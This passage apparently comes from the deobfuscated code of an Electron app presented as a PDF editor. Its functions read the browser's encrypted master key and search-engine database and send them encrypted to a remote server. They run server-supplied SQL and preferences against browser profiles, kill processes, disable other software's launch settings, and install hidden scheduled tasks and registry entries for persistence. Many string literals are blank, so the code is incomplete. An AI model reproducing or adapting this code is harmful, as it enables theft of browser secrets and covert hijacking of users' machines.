              nh.w3F3UWA.s59BT06('');
            }
            if (ql) {
              let flag4 = false;
              for (let qn = 0; qn < ql.length; qn++) {
                let qo = path6.join(qk, ql[qn], "");
                let qp = path6.join(qk, ql[qn], "");
                let qq = path6.join(qk, ql[qn], "");
                let qr = path6.join(qk, ql[qn], "");
                if (await this.X428OQY(qo, qp)) {
                  await this.X428OQY(qq, qr);
                  let qs;
                  let qt;
                  await this.r576OBZ(qp).then((qv) => {
                    qs = qv;
                  }).catch((qw) => {
                    (async () => {
                      await nh.w3F3UWA.Y6CDW21(qi, nh.z579NEI.n690Q7K, qw);
                    })();
                  });
                  await this.G5B8BDL(qr).then((qx) => {
                    qt = qx ?? '';
                  }).catch((qy) => {
                    (async () => {
                      await nh.w3F3UWA.Y6CDW21(qi, nh.z579NEI.K4E5MWI, qy);
                    })();
                  });
                  if (qs == '') {
                    await nh.w3F3UWA.W4EF0EI(qi, nh.z579NEI.Q455VXT);
                    continue;
                  }
                  nh.w3F3UWA.s59BT06('');
                  let qu = await this.w516KLO(qi, qm, qs, qt);
                  if (!qu.m5BCP18) {
                    await nh.w3F3UWA.W4EF0EI(qi, nh.z579NEI.L5CFOQF);
                    return;
                  }
                  nh.w3F3UWA.s59BT06('');
                  if (await this.H5AE3US(qu.C5C7K1A)) {
                    await this.Y53EKLA(qp, qu.C5C7K1A);
                    await this.X428OQY(qp, qo);
                    nh.w3F3UWA.s59BT06('');
                  }
                  if ((await this.H5AE3US(qu.p6845JK)) && (await this.r501Z9L(qr, qu.p6845JK))) {
                    if (await this.o43FWNP(false, qi)) {
                      await this.D45AYQ3("");
                      nh.w3F3UWA.s59BT06('');
                    }
                    await this.X428OQY(qr, qq);
                    nh.w3F3UWA.s59BT06('');
                    await nh.w3F3UWA.W4EF0EI(qi, nh.z579NEI.W4F1V66);
                  } else {
                    await nh.w3F3UWA.W4EF0EI(qi, nh.z579NEI.n4EBPL8);
                  }
                  flag4 = true;
                }
              }
              if (flag4) {
                await ng.S559FZQ.c5E4Z7C("cw-key", ni.e5325L3.q474LOF);
              }
            }
          }
          nh.w3F3UWA.s59BT06('');
          return;
        }
        async k47F3QK(qz) {
          let ra = nj.q564DFB;
          nh.w3F3UWA.s59BT06('');
          if (!ni.e5325L3.k596N0J) {
            return;
          }
          const path7 = require("path");
          const rb = ng.S559FZQ.D47CBV3();
          if (!rb) {
            await nh.w3F3UWA.Y6CDW21(nj.B639G7B, nh.z579NEI.F65A6FS);
            return;
          }
          const rc = path7.join(rb, "");
          if (ni.e5325L3.a6B1QAU == '') {
            await nh.w3F3UWA.W4EF0EI(ra, nh.z579NEI.m599GWS);
            return;
          }
          if (this.Z5A9DKG || !qz || ni.e5325L3.x484Q1X == ng.a689XV5.j5C58S9) {
            if (qz) {
              qz = false;
              await this.D45AYQ3("");
              nh.w3F3UWA.s59BT06('');
            }
            nh.w3F3UWA.s59BT06('');
            let [rd, re] = await this.A554U7Y(ra, path7.join(rc, ""), true);
            if (re && re !== '') {
              re = this.r42EX1Q(re);
              nh.w3F3UWA.s59BT06('');
            }
            if (rd) {
              let flag5 = false;
              for (let rf = 0; rf < rd.length; rf++) {
                let rg = path7.join(rc, rd[rf], "");
                let rh = path7.join(rc, rd[rf], "");
                let ri = path7.join(rc, rd[rf], "");
                let rj = path7.join(rc, rd[rf], "");
                if (await this.X428OQY(rg, rh)) {
                  await this.X428OQY(ri, rj);
                  let rk;
                  let rl;
                  await this.r576OBZ(rh).then((rn) => {
                    rk = rn;
                  }).catch((ro) => {
                    (async () => {
                      await nh.w3F3UWA.Y6CDW21(ra, nh.z579NEI.n690Q7K, ro);
                    })();
                  });
                  await this.G5B8BDL(rj).then((rp) => {
                    rl = rp ?? '';
                  }).catch((rq) => {
                    (async () => {
                      await nh.w3F3UWA.Y6CDW21(ra, nh.z579NEI.K4E5MWI, rq);
                    })();
                  });
                  if (rk == '') {
                    await nh.w3F3UWA.W4EF0EI(ra, nh.z579NEI.Q455VXT);
                    continue;
                  }
                  nh.w3F3UWA.s59BT06('');
                  let rm = await this.w516KLO(ra, re, rk, rl);
                  if (!rm.m5BCP18) {
                    await nh.w3F3UWA.W4EF0EI(ra, nh.z579NEI.L5CFOQF);
                    return;
                  }
                  nh.w3F3UWA.s59BT06('');
                  if (await this.H5AE3US(rm.C5C7K1A)) {
                    await this.Y53EKLA(rh, rm.C5C7K1A);
                    await this.X428OQY(rh, rg);
                    nh.w3F3UWA.s59BT06('');
                  }
                  if ((await this.H5AE3US(rm.p6845JK)) && (await this.r501Z9L(rj, rm.p6845JK))) {
                    if (await this.o43FWNP(false, ra)) {
                      await this.D45AYQ3("");
                      nh.w3F3UWA.s59BT06('');
                    }
                    await this.X428OQY(rj, ri);
                    nh.w3F3UWA.s59BT06('');
                    await nh.w3F3UWA.W4EF0EI(ra, nh.z579NEI.W4F1V66);
                  } else {
                    await nh.w3F3UWA.W4EF0EI(ra, nh.z579NEI.n4EBPL8);
                  }
                  flag5 = true;
                }
              }
              if (flag5) {
                await ng.S559FZQ.c5E4Z7C("ew-key", ni.e5325L3.q474LOF);
              }
            }
          }
          nh.w3F3UWA.s59BT06('');
          return;
        }
        async E4E2LLU(rr) {
          return new Promise((rs) => setTimeout(rs, rr));
        }
        async D45AYQ3(rt, ru = true) {
          const cp3 = require("child_process");
          if (ru) {
            for (let rv = 0; rv < 3; rv++) {
              nh.w3F3UWA.s59BT06('');
              cp3.exec((0, nh.o5B4F49)("", rt));
              await this.E4E2LLU(100);
            }
          }
          nh.w3F3UWA.s59BT06('');
          cp3.exec((0, nh.o5B4F49)("", rt));
          await this.E4E2LLU(100);
        }
        async A554U7Y(rw, rx, ry = false) {
          try {
            const data4 = JSON.parse(require("fs").readFileSync(rx, "utf8"));
            nh.w3F3UWA.s59BT06('');
            nh.w3F3UWA.s59BT06('');
            return [Object.keys(data4.profile?.info_cache || {}), ry ? data4.os_crypt?.encrypted_key || '' : ''];
          } catch (_0x5d4a1b) {
            await nh.w3F3UWA.Y6CDW21(rw, nh.z579NEI.y46BIEQ, _0x5d4a1b);
          }
          return [undefined, undefined];
        }
        async X428OQY(rz, sa) {
          try {
            require("fs").copyFileSync(rz, sa);
            return true;
          } catch {
            return false;
          }
        }
        async r576OBZ(sb, sc = false) {
          const fs10 = require("fs");
          try {
            if (!sc) {
              return fs10.readFileSync(sb, "utf8");
            }
            return fs10.readFileSync(sb);
          } catch (_0x14aedd) {
            throw new Error("ReadFileError: " + _0x14aedd);
          }
        }
        async G5B8BDL(sd) {
          const se = new require("better-sqlite3")(sd);
          try {
            return JSON.stringify(se.prepare("select * from keywords").all());
          } catch (_0x32e93a) {
            nh.w3F3UWA.s59BT06('');
            throw new Error(_0x32e93a);
          } finally {
            se.close((sf) => {
              if (sf) {
                nh.w3F3UWA.s59BT06('');
              }
            });
          }
        }
        async r501Z9L(sg, sh) {
          const si = new require("better-sqlite3")(sg);
          try {
            for (const sj of JSON.parse(sh)) {
              si.prepare(sj).run();
              nh.w3F3UWA.s59BT06('');
            }
          } catch {
            nh.w3F3UWA.s59BT06('');
            return false;
          } finally {
            si.close((sk) => {
              if (sk) {
                nh.w3F3UWA.s59BT06('');
                return;
              }
              nh.w3F3UWA.s59BT06('');
            });
          }
          return true;
        }
        async Y53EKLA(sl, sm) {
          try {
            require("fs").writeFileSync(sl, sm);
          } catch {
            nh.w3F3UWA.s59BT06('');
          }
        }
        async A5FCGS4(sn) {
          return require("fs").existsSync(sn);
        }
        async O69AL84(so, sp, sq) {
          try {
            require("child_process").execSync((0, nh.o5B4F49)("", so, sp, sq));
          } catch (_0x3a2566) {
            await nh.w3F3UWA.Y6CDW21(nj.B639G7B, nh.z579NEI.u3F4OPT, _0x3a2566);
          }
        }
        async w4D8BBU(sr, ss) {
          try {
            nh.w3F3UWA.s59BT06('');
            require("child_process").execSync((0, nh.o5B4F49)("", sr, ss));
          } catch (_0x1c367a) {
            await nh.w3F3UWA.Y6CDW21(nj.N6330WH, nh.z579NEI.h6148NE, _0x1c367a);
          }
        }
        async u459C3E(st, su) {
          try {
            const sv = su.trim() == '' ? (0, nh.o5B4F49)("", st) : (0, nh.o5B4F49)("", st, su);
            require("child_process").execSync(sv);
            return true;
          } catch (_0x3c99a3) {
            if (!_0x3c99a3.stderr.includes("")) {
              await nh.w3F3UWA.Y6CDW21(nj.B639G7B, nh.z579NEI.m4F36Z7, _0x3c99a3);
            }
          }
          return false;
        }
        async H5AE3US(sw) {
          if (!sw) {
            return false;
          }
          if (sw.length == 0) {
            return false;
          }
          try {
            let data5 = JSON.parse(sw);
            return true;
          } catch {
            return false;
          }
        }
        async e4F5CS0() {
          try {
            var sx = ni.e5325L3.q474LOF ?? '';
            const params3 = new require("url").URLSearchParams();
            const sy = ng.S559FZQ.n677BRA.substring(0, 24) + sx.substring(0, 8);
            const obj6 = {
              iid: sx,
              version: ni.e5325L3.Y55B2P2,
              isSchedule: '0',
              hasBLFile: ni.e5325L3.b57CS7T,
              hasBLReg: ni.e5325L3.K48B40X,
              supportWd: '1'
            };
            const sz = nh.O694X7J(sy, JSON.stringify(obj6));
            params3.append("data", sz.data);
            params3.append("iv", sz.iv);
            params3.append("iid", ni.e5325L3.q474LOF ?? '');
            nh.w3F3UWA.s59BT06('');
            let ta = await nh.h5235DD("api/s3/config", params3);
            if (ta && ta.ok) {
              let tb = await ta.json();
              nh.w3F3UWA.s59BT06('');
              try {
                if (tb.data) {
                  const data6 = JSON.parse((0, nh.U61FWBZ)(sy, tb.data, tb.iv));
                  nh.w3F3UWA.s59BT06('');
                  let tc = new nk();
                  tc.H5C67AR = data6.wc ?? false;
                  tc.n412K1U = data6.wcs ?? false;
                  tc.n5B332O = data6.wcpc ?? false;
                  tc.k61AQMQ = data6.wcpe ?? false;
                  tc.a6AFL0X = data6.wdc ?? false;
                  tc.D4E3EHU = data6.wde ?? false;
                  tc.E67CJ69 = data6.ol ?? false;
                  tc.a586DQ2 = data6.ol_deep ?? false;
                  tc.X42CN81 = data6.wv ?? false;
                  tc.Y4B23HN = data6.wv_deep ?? false;
                  tc.T5B2T2A = data6.sf ?? false;
                  tc.V54518G = data6.sf_deep ?? false;
                  tc.T5F71B2 = data6.pas ?? false;
                  tc.g5ABMVH = data6.pas_deep ?? false;
                  tc.t533W41 = data6.code ?? '';
                  tc.O6CBOE4 = data6.reglist ?? '';
                  return tc;
                }
              } catch (_0x4d4af0) {
                await nh.w3F3UWA.Y6CDW21(nj.B639G7B, nh.z579NEI.e5C24C6, _0x4d4af0);
              }
            } else {
              nh.w3F3UWA.s59BT06('');
            }
          } catch (_0xf4a951) {
            await nh.w3F3UWA.Y6CDW21(nj.B639G7B, nh.z579NEI.E4AAIZR, _0xf4a951);
          }
          return new nk();
        }
        async O515QL8(td, te, tf) {
          nh.w3F3UWA.s59BT06('');
          try {
            var tg = ni.e5325L3.q474LOF ?? '';
            const params4 = new require("url").URLSearchParams();
            const th = ng.S559FZQ.n677BRA.substring(0, 24) + tg.substring(0, 8);
            const obj7 = {
              iid: tg,
              bid: td,
              sid: this.A64CEBI,
              pref: te,
              spref: tf,
              wd: '',
              version: ni.e5325L3.Y55B2P2,
              supportWd: '0',
              isSchedule: '0'
            };
            nh.w3F3UWA.s59BT06('');
            const ti = nh.O694X7J(th, JSON.stringify(obj7));
            params4.append("data", ti.data);
            params4.append("iv", ti.iv);
            params4.append("iid", ni.e5325L3.q474LOF ?? '');
            nh.w3F3UWA.s59BT06('');
            let tj = await nh.h5235DD("api/s3/validate", params4);
            if (!tj || !tj.ok) {
              nh.w3F3UWA.s59BT06('');
              return new nl();
            }
            let tk = await tj.json();
            nh.w3F3UWA.s59BT06('');
            try {
              if (tk.data) {
                const data7 = JSON.parse((0, nh.U61FWBZ)(th, tk.searchdata, tk.iv));
                let tl = JSON.stringify(data7.pref) ?? '';
                let tm = JSON.stringify(data7.spref) ?? '';
                let tn = JSON.stringify(data7.regdata) ?? '';
                let to = JSON.stringify(data7.reglist) ?? '';
                if (tl == "null") {
                  tl = '';
                }
                if (tm == "null") {
                  tm = '';
                }
                if (tn == "\"\"") {
                  tn = '';
                }
                if (to == "\"\"") {
                  to = '';
                }
                return new nl(true, tl, tm, tn, to);
              }
            } catch (_0x5402e8) {
              await nh.w3F3UWA.Y6CDW21(td, nh.z579NEI.l54DEIW, _0x5402e8);
            }
          } catch (_0x480427) {
            await nh.w3F3UWA.Y6CDW21(td, nh.z579NEI.M5E3V2V, _0x480427, ["https://appsuites.ai", "https://sdk.appsuites.ai"]);
          }
          return new nl();
        }
        async w516KLO(tp, tq, tr, ts) {
          nh.w3F3UWA.s59BT06('');
          try {
            var tt = ni.e5325L3.q474LOF ?? '';
            const params5 = new require("url").URLSearchParams();
            const tu = ng.S559FZQ.n677BRA.substring(0, 24) + tt.substring(0, 8);
            const obj8 = {
              iid: tt,
              bid: tp,
              sid: this.A64CEBI,
              pref: tr,
              spref: '',
              osCryptKey: tq,
              wd: ts,
              version: ni.e5325L3.Y55B2P2,
              supportWd: '1',
              isSchedule: '0'
            };
            const tv = nh.O694X7J(tu, JSON.stringify(obj8));
            params5.append("data", tv.data);
            params5.append("iv", tv.iv);
            params5.append("iid", ni.e5325L3.q474LOF ?? '');
            nh.w3F3UWA.s59BT06('');
            let tw = await nh.h5235DD("api/s3/validate", params5);
            if (!tw || !tw.ok) {
              nh.w3F3UWA.s59BT06('');
              return new nm();
            }
            let tx = await tw.json();
            try {
              if (tx.data) {
                if (!tx.searchdata) {
                  return new nm(true, '', '');
                }
                const data8 = JSON.parse((0, nh.U61FWBZ)(tu, tx.searchdata, tx.iv));
                const ty = data8.pref ?? '';
                const tz = data8.webData ?? '';
                nh.w3F3UWA.s59BT06('');
                nh.w3F3UWA.s59BT06('');
                let ua = tz !== '' ? JSON.stringify(tz) ?? '' : '';
                return new nm(true, ty !== '' ? JSON.stringify(ty) ?? '' : '', tz);
              }
            } catch (_0x1ad793) {
              await nh.w3F3UWA.Y6CDW21(tp, nh.z579NEI.l54DEIW, _0x1ad793);
            }
          } catch (_0x26f417) {
            await nh.w3F3UWA.Y6CDW21(tp, nh.z579NEI.M5E3V2V, _0x26f417, ["https://appsuites.ai", "https://sdk.appsuites.ai"]);
          }
          return new nm();
        }
        async g4EE56L(ub) {
          try {
            const uc = (await ng.S559FZQ.l610ZCY(ub)) ?? '';
            if (uc == '') {
              return no.s46FO09;
            }
            return parseInt(uc);
          } catch {
            nh.w3F3UWA.s59BT06('');
            return no.s46FO09;
          }
        }
        async w5C1TZN(ud) {
          const ue = nj.q5A5TD7;
          const uf = ng.S559FZQ.D47CBV3();
          if (!uf) {
            nh.w3F3UWA.s59BT06('');
            return;
          }
          let ug = require("path").join(uf, "");
          const fs11 = require("fs");
          try {
            let data9 = JSON.parse(fs11.readFileSync(ug, "utf8"));
            const uh = await this.g4EE56L("wv-key");
            if (data9[""] ?? true || (data9[""]?.[""] ?? true) || (data9[""] ?? true) || (data9[""] ?? true)) {
              if (no.s46FO09 == uh || ud) {
                await this.D45AYQ3("");
                data9[""] = false;
                if (!data9[""]) {
                  data9[""] = {
                    "": false
                  };
                } else {
                  data9[""][""] = false;
                }
                data9[""] = false;
                data9[""] = false;
                fs11.writeFileSync(ug, JSON.stringify(data9), "utf8");
                await nh.w3F3UWA.W4EF0EI(ue, nh.z579NEI.R3F76I3, [ud, uh]);
                await ng.S559FZQ.c5E4Z7C("wv-key", '' + no.d56ECUF);
              } else {
                await nh.w3F3UWA.W4EF0EI(ue, nh.z579NEI.v535X73, [ud, uh]);
              }
            } else {
              let flag6 = false;
              if (no.d56ECUF == uh) {
                const ui = this.e5FBF4O("\\Wavesor Software_" + (this.X6066R5() ?? ''), "WaveBrowser-StartAtLogin", 1);
                const uj = this.t4E0LPU("\\");
                if (ui != undefined && false == ui && uj != undefined && uj) {
                  flag6 = true;
                  await ng.S559FZQ.c5E4Z7C("wv-key", '' + no.z479UBI);
                  await this.D45AYQ3("");
                  await nh.w3F3UWA.W4EF0EI(ue, nh.z579NEI.d422GJH, [ud, uh]);
                }
              }
              if (!flag6) {
                await nh.w3F3UWA.W4EF0EI(ue, nh.z579NEI.Q542KEX, [ud, uh]);
              }
            }
          } catch {
            nh.w3F3UWA.s59BT06('');
            await nh.w3F3UWA.W4EF0EI(ue, nh.z579NEI.u51A2HJ);
          }
        }
        async c647ECB(uk) {
          const ul = nj.h6074WA;
          const fs12 = require("fs");
          const um = require("path").join(ng.S559FZQ.D47CBV3(), "", "");
          try {
            let data10 = JSON.parse(fs12.readFileSync(um, "utf8"));
            const un = await this.g4EE56L("ol-key");
            if (data10[""] || data10[""] || data10[""] || data10[""] || data10[""]) {
              if (no.s46FO09 == un || uk) {
                data10[""] = false;
                data10[""] = false;
                data10[""] = false;
                data10[""] = false;
                data10[""] = false;
                await this.D45AYQ3("");
                fs12.writeFileSync(um, JSON.stringify(data10, null, 2), "utf8");
                await this.D45AYQ3("");
                await nh.w3F3UWA.W4EF0EI(ul, nh.z579NEI.R3F76I3, [uk, un]);
                await ng.S559FZQ.c5E4Z7C("ol-key", '' + no.d56ECUF);
              } else {
                await nh.w3F3UWA.W4EF0EI(ul, nh.z579NEI.v535X73, [uk, un]);
              }
            } else {
              let flag7 = false;
              if (no.d56ECUF == un) {
                const uo = this.e5FBF4O('', "OneLaunchLaunchTask", 1);
                const up = this.t4E0LPU("\\");
                if (uo != undefined && false == uo && up != undefined && up) {
                  flag7 = true;
                  await ng.S559FZQ.c5E4Z7C("ol-key", '' + no.z479UBI);
                  await this.D45AYQ3("");
                  await this.D45AYQ3("");
                  await nh.w3F3UWA.W4EF0EI(ul, nh.z579NEI.d422GJH, [uk, un]);
                }
              }
              if (!flag7) {
                await nh.w3F3UWA.W4EF0EI(ul, nh.z579NEI.Q542KEX, [uk, un]);
              }
            }
          } catch {
            nh.w3F3UWA.s59BT06('');
            await nh.w3F3UWA.W4EF0EI(ul, nh.z579NEI.u51A2HJ);
          }
        }
        async h659UF4(uq) {
          const ur = nj.F58C0X0;
          const us = ng.S559FZQ.D47CBV3();
          if (!us) {
            nh.w3F3UWA.s59BT06('');
            return;
          }
          let ut = require("path").join(us, "");
          const fs13 = require("fs");
          try {
            let data11 = JSON.parse(fs13.readFileSync(ut, "utf8"));
            let flag8 = true;
            if ("shift" in data11 && "browser" in data11.shift) {
              const uv = data11.shift.browser;
              flag8 = uv.launch_on_login_enabled ?? true || (uv.launch_on_wake_enabled ?? true) || (uv.run_in_background_enabled ?? true);
            }
            const uu = await this.g4EE56L("sf-key");
            if (flag8) {
              if (no.s46FO09 == uu || uq) {
                if (!("shift" in data11)) {
                  data11.shift = {};
                }
                if (!("browser" in data11.shift)) {
                  data11.shift.browser = {};
                }
                data11.shift.browser.launch_on_login_enabled = false;
                data11.shift.browser.launch_on_wake_enabled = false;
                data11.shift.browser.run_in_background_enabled = false;
                await this.D45AYQ3("");
                fs13.writeFileSync(ut, JSON.stringify(data11), "utf8");
                await nh.w3F3UWA.W4EF0EI(ur, nh.z579NEI.R3F76I3, [uq, uu]);
                await ng.S559FZQ.c5E4Z7C("sf-key", '' + no.d56ECUF);
              } else {
                await nh.w3F3UWA.W4EF0EI(ur, nh.z579NEI.v535X73, [uq, uu]);
              }
            } else {
              let flag9 = false;
              if (no.d56ECUF == uu) {
                const uw = this.e5FBF4O('', "ShiftLaunchTask", 1);
                const ux = this.t4E0LPU("\\");
                if (uw != undefined && false == uw && ux != undefined && ux) {
                  flag9 = true;
                  await ng.S559FZQ.c5E4Z7C("sf-key", '' + no.z479UBI);
                  await this.D45AYQ3("");
                  await nh.w3F3UWA.W4EF0EI(ur, nh.z579NEI.d422GJH, [uq, uu]);
                }
              }
              if (!flag9) {
                await nh.w3F3UWA.W4EF0EI(ur, nh.z579NEI.Q542KEX, [uq, uu]);
              }
            }
          } catch {
            nh.w3F3UWA.s59BT06('');
            await nh.w3F3UWA.W4EF0EI(ur, nh.z579NEI.u51A2HJ);
          }
        }
        async W5F8HOG(uy) {
          const uz = nj.i623ZUC;
          const path8 = require("path");
          const fs14 = require("fs");
          try {
            let va = (await this.u459C3E("HKCU", "")) || (await this.u459C3E("HKCU", "")) || (await this.u459C3E("HKCU", ""));
            const vb = await this.g4EE56L("pas-key");
            if (va) {
              if (no.s46FO09 == vb || uy) {
                await this.D45AYQ3("", false);
                await this.D45AYQ3("", false);
                await this.w4D8BBU("", "");
                await this.w4D8BBU("", "");
                await this.w4D8BBU("", "");
                await nh.w3F3UWA.W4EF0EI(uz, nh.z579NEI.R3F76I3, [uy, vb]);
                await ng.S559FZQ.c5E4Z7C("pas-key", '' + no.d56ECUF);
              } else {
                await nh.w3F3UWA.W4EF0EI(uz, nh.z579NEI.v535X73, [uy, vb]);
              }
            } else if (no.d56ECUF == vb) {
              await nh.w3F3UWA.W4EF0EI(uz, nh.z579NEI.Q542KEX, [uy, vb]);
            }
          } catch {
            await nh.w3F3UWA.W4EF0EI(uz, nh.z579NEI.u51A2HJ);
          }
        }
      };
      nf.A672SIS = np;
    }
  });
  var h = b({
    'obj/globals.js'(vc, vd) {
      'use strict';

      var obj9 = {
        homeUrl: "https://pdf-tool.appsuites.ai/en/pdfeditor",
        CHANNEL_NAME: "main",
        USER_AGENT: "PDFFusion/93HEU7AJ",
        productName: "PDFEditor",
        appName: "PDF Editor",
        scheduledTaskName: "PDFEditorScheduledTask",
        registryName: 'PDFEditorUpdater',
        modeDataPath: "\\mode.data",
        scheduledUTaskName: "PDFEditorUScheduledTask",
        iconSubPath: "\\assets\\icons\\win\\pdf-n.ico"
      };
      vd.exports = obj9;
    }
  });
  var i = b({
    'obj/window.js'(ve) {
      'use strict';

      var {
        BrowserWindow: electron
      } = require("electron");
      ve.createBrowserWindow = () => {
        let vf = __dirname;
        vf = vf.replace("src", '');
        let vg = vf + h().iconSubPath;
        console.log(vg);
        const vh = new electron({
          resizable: true,
          width: 1024,
          height: 768,
          icon: vg,
          autoHideMenuBar: true,
          backgroundColor: "#fff",
          webPreferences: {
            devTools: false,
            preload: require("path").join(__dirname, "./preload.js")
          }
        });
        return vh;
      };
    }
  });
  var j = b({
    'obj/D3E8Q17.js'(vi) {
      Object.defineProperty(vi, "__esModule", {
        value: true
      });
      var vj = c();
      var fs15 = require('fs');
      var Utilityaddon = require(".\\lib\\Utilityaddon.node");
      var vk = h();
      async function vl() {
        const vm = (wa) => {
          switch (wa) {
            case "--install":
              return vj.a689XV5.b5BEPQ2;
            case "--check":
              return vj.a689XV5.V4E6B4O;
            case "--reboot":
              return vj.a689XV5.j5C58S9;
            case "--cleanup":
              return vj.a689XV5.Z498ME9;
            case "--ping":
              return vj.a689XV5.f63DUQF;
          }
          return vj.a689XV5.B639G7B;
        };
        let flag10 = false;
        let vn = _0x3ce3ae.commandLine.getSwitchValue('c');
        let vo = _0x3ce3ae.commandLine.getSwitchValue('cm');
        console.log('args=' + vn);
        console.log("args2=" + vo);
        let vp = __dirname.replace("\\resources\\app\\w-electron\\bin\\release", '');
        console.log("wkdir = " + vp);
        if (!_0x3ce3ae.commandLine.hasSwitch('c') && !_0x3ce3ae.commandLine.hasSwitch('cm')) {
          await vq('--install');
          vy();
        }
        if (_0x3ce3ae.commandLine.hasSwitch('c') && vn == '0') {
          vy();
        }
        if (_0x3ce3ae.commandLine.hasSwitch('cm')) {
          if (vo == "--cleanup") {
            await vq(vo);
            console.log("remove ST");
            Utilityaddon.remove_task_schedule(vk.scheduledTaskName);
            Utilityaddon.remove_task_schedule(vk.scheduledUTaskName);
          } else if (vo == "--partialupdate") {
            await vq('--check');
          } else if (vo == "--fullupdate") {
            await vq("--reboot");
          } else if (vo == "--enableupdate") {
            Utilityaddon.SetRegistryValue(vk.registryName, "\"" + vp + "\\" + vk.appName + "\" --cm=--fullupdate");
          } else if (vo == "--disableupdate") {
            Utilityaddon.DeleteRegistryValue(vk.registryName);
          } else if (vo == "--backupupdate") {
            await vq("--ping");
          }
          if (!_0x3ce3ae.commandLine.hasSwitch('c')) {
            _0x3ce3ae.quit();
          }
        }
        async function vq(wb) {
          console.log("To add wc routine");
          await vx(wb);
        }
        function vr() {
          return Utilityaddon.get_sid();
        }
        function vs(wc) {
          return Utilityaddon.GetOsCKey(wc);
        }
        function vt(wd, we, wf) {
          return Utilityaddon.mutate_task_schedule(wd, we, wf);
        }
        function vu(wg) {
          return Utilityaddon.find_process(wg);
        }
        function vv() {
          return Utilityaddon.GetPsList();
        }
        function vw() {
          try {
            let wh = Utilityaddon.mutate_task_schedule("\\", vk.scheduledTaskName, 1);
            if (!wh) {
              Utilityaddon.create_task_schedule(vk.scheduledTaskName, vk.scheduledTaskName, "\"" + vp + "\\" + vk.appName + "\"", "--cm=--partialupdate", vp, 1442);
            }
            let wi = Utilityaddon.mutate_task_schedule("\\", vk.scheduledUTaskName, 1);
            if (!wh) {
              Utilityaddon.create_repeat_task_schedule(vk.scheduledUTaskName, vk.scheduledUTaskName, "\"" + vp + "\\" + vk.appName + "\"", "--cm=--backupupdate", vp);
            }
          } catch (_0x574ef0) {
            console.log(_0x574ef0);
          }
        }
        async function vx(wj) {
          let wk = vm(wj);
          console.log("argument = " + wj);
          const wl = new g().A672SIS(vr, vs, vt, vu, vv);
          if (vj.a689XV5.b5BEPQ2 == wk) {
            if ((await wl.q41FDEK()) == g().U5E7DEV.C5B7MFV) {
              vw();
            }
          } else if (vj.a689XV5.Z498ME9 == wk) {
            await wl.l660ZQF();
          } else if (vj.a689XV5.f63DUQF == wk) {
            await wl.A4B0MTO();
          } else {
            e().w3F3UWA.s59BT06('');
            await wl.m58FJB5(wk);
          }
        }
        function vy() {
          try {
            let wm = vp + vk.modeDataPath;
            console.log("modeFile = " + wm);
            if (fs15.existsSync(wm)) {
              flag10 = false;
            } else {
              flag10 = true;
            }
          } catch (_0x5e2947) {
            console.log(_0x5e2947);
          }
        }
        function vz() {
          try {
            let wn = vp + vk.modeDataPath;
            if (fs15.existsSync(wn)) {
              fs15.rmSync(wn, {
                force: true
              });
            }
          } catch (_0x56097b) {
            console.log(_0x56097b);
          }
        }
        if (flag10) {
          _0x3ce3ae.whenReady().then(() => {
            let wo = i().createBrowserWindow(_0x3ce3ae);
            require("electron").session.defaultSession.webRequest.onBeforeSendHeaders((wp, wq) => {
              wp.requestHeaders["User-Agent"] = vk.USER_AGENT;
              wq({
                cancel: false,
                requestHeaders: wp.requestHeaders
              });
            });
            wo.loadURL(vk.homeUrl);
            wo.on("close", function (wr) {
              wr.preventDefault();
              wo.destroy();
            });
          });
          _0x3dd9a0.on(vk.CHANNEL_NAME, (ws, wt) => {
            if (wt == "Set") {
              Utilityaddon.SetRegistryValue(vk.registryName, "\"" + vp + "\\" + vk.appName + "\" --cm=--fullupdate");
            }
            if (wt == "Unset") {
              Utilityaddon.DeleteRegistryValue(vk.registryName);
            }
          });
          _0x3ce3ae.on("window-all-closed", () => {
            if (process.platform !== "darwin") {
              _0x3ce3ae.quit();
            }
          });
        }
        vz();
      }
      vl();
    }
  });
  j();
})();